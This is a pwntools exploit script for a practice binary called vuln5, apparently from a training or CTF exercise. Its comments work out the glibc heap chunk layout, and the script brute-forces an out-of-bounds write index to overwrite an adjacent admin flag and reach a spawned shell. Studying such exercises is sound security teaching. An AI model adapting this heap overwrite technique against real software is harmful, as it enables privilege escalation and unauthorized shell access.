# Exploit for vuln5: Heap OOB Write (Bypass Admin)
from pwn import *
import os

binary_path = os.path.abspath('../build/vuln5')
if len(sys.argv) > 1:
    binary_path = os.path.abspath(sys.argv[1])
elf = ELF(binary_path, checksec=False)
context.binary = elf

log.info("Starting exploit for vuln5 (OOB Write -> Logic Bypass)...")

# Vulnerability:
# We can write (Widget*)1 to WidgetList[index].
# WidgetList is allocated first? Then AdminSession?
# Or AdminSession first?
#
# Stack/Heap Order is nondeterministic (to some extent) unless we control allocations.
# But here `WidgetList` and `admin` are allocated sequentially.
# WidgetList = malloc(MAX * 8) = 32 bytes.
# admin = malloc(...).
# Usually, sequential mallocs are adjacent (with metadata overhead).
#
# WidgetList indices: 0, 1, 2, 3.
# Index 4 is OOB.
# Index 4 corresponds to offset 4 * 8 = 32 bytes.
# Effectively, WidgetList[4] writes at (base + 32).
#
# Is `admin` located at `base + 32` + overhead?
# Chunk overhead on 64-bit glibc is usually 16 bytes (prev_size + size).
# So `admin` user data starts at `base + 32 + 16`?
# In that case, writing to offset 32 overwrites the metadata of the next chunk (size/flags).
# This causes crash on free, but not logic bypass.
#
# We need to write FURTHER.
# Index 5 -> offset 40.
# Index 6 -> offset 48.
#
# If overhead is 16 bytes, then `admin` starts at offset 48 (32 + 16).
# WidgetList[6] writes to offset 48.
# This should overwrite admin->isAdmin (first field).
#
# Let's bruteforce the index!
# Try indices 4..10.

found = False
for idx in range(4, 20):
    log.info(f"Probable index {idx}...")
    p = process([binary_path, str(idx)])
    try:
        # Wait for "Writing..."
        p.recvuntil(b"Writing")
        
        # Check output
        output = p.recv(timeout=0.2)
        if b"Spawning Shell" in output:
            log.success(f"SUCCESS! Admin bypass at index {idx}")
            log.info("Switching to interactive mode...")
            p.interactive()
            found = True
            break
        else:
            p.close()
    except: 
        p.close()

if not found:
    log.failure("Could not determine correct offset. Heap layout might differ.")
